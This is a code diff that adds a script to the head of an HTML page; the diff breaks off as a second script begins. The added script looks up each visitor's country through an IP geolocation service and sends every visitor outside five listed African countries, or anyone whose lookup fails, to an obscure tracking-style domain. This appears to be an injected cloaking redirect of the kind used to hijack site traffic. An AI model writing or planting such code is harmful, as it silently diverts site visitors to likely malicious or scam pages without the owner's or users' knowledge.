@@ -1,6 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+(async function () {
+    // Allowed countries
+    const allowedCountries = [
+        "Nigeria",
+        "Mozambique",
+        "Zimbabwe",
+        "Lesotho",
+        "South Africa"
+    ];
+
+    // Redirect URL
+    const redirectUrl = "https://wwmyokgik.one/cl/92ca7683c7786fa7";
+
+    try {
+        // Get visitor country
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+
+        const userCountry = data.country_name;
+
+        // Redirect if country is NOT allowed
+        if (!allowedCountries.includes(userCountry)) {
+            window.location.href = redirectUrl;
+        }
+
+    } catch (error) {
+        console.log("Country detection failed:", error);
+
+        // Optional: redirect if API fails
+        window.location.href = redirectUrl;
+    }
+})();
+</script>
 <script>
 (function () {
 
